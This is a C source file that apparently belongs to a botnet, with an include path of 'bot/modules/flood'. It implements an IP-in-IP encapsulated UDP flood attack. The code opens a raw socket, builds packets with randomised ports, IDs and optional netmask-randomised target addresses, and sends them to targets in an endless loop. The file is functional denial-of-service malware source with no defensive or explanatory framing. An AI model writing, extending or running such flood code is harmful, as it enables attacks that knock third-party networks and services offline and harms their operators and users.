#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_ipipudp(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t buffer_len = 0;
  uint8_t *buffer = NULL;

  // port options
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);

  // len options
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);

  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  if (!random) {
    buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
  }

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    LOG_ERROR("allocating targets failed");
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
    LOG_ERROR("opening a raw socket failed");
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    LOG_INFO("setting HDRINCL failed");
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *outer = (struct iphdr *)packets[i];
    struct iphdr *inner = (struct iphdr *)(outer + 1);
    struct udphdr *udp = (struct udphdr *)(inner + 1);
    char *data = (char *)(udp + 1);

    // outer
    outer->version = IPVERSION;
    outer->ttl = IPDEFTTL;
    outer->protocol = IPPROTO_IPIP;
    outer->ihl = 5; // Standard IP header length (5 * 4 = 20 bytes)
    outer->tos = 0;
    outer->saddr = network_local_addr();

    // inner
    inner->version = IPVERSION;
    inner->ttl = IPDEFTTL;
    inner->protocol = IPPROTO_UDP;
    inner->ihl = 5;
    inner->tos = 0;

    if (!random) {
      buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
      memcpy(data, buffer, buffer_len);
    }
  }

  while (true) {
    // send targets
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];

      // update target address if netmask
      target_random_addr(target);

      struct iphdr *outer = (struct iphdr *)packets[i];
      struct iphdr *inner = (struct iphdr *)(outer + 1);
      struct udphdr *udp = (struct udphdr *)(inner + 1);
      char *data = (char *)(udp + 1);

      // generate buffer
      if (random) {
        buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
        memcpy(data, buffer, buffer_len);
      }

      outer->daddr = target->address;
      outer->id = xoshiro_next() & 0xFFFF;

      // copy addresses
      inner->saddr = outer->saddr;
      inner->daddr = outer->daddr;
      inner->id = xoshiro_next() & 0xFFFF;

      // calc lengths
      uint16_t inner_len = sizeof(struct iphdr) + sizeof(struct udphdr) + buffer_len;
      inner->tot_len = htons(inner_len);
      outer->tot_len = htons(sizeof(struct iphdr) + inner_len);

      udp->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      udp->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
      udp->len = htons(sizeof(struct udphdr) + buffer_len);

      outer->check = 0;
      outer->check = csum_compute(outer, sizeof(struct iphdr));

      inner->check = 0;
      inner->check = csum_compute(inner, sizeof(struct iphdr));

      udp->check = 0;
      udp->check = checksum_tcpudp(inner, udp, udp->len, sizeof(struct udphdr) + buffer_len);

      sendto(fd, packets[i], ntohs(outer->tot_len), 0, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));

      if (random) {
        free(buffer);
        buffer = NULL;
      }
    }
  }
}
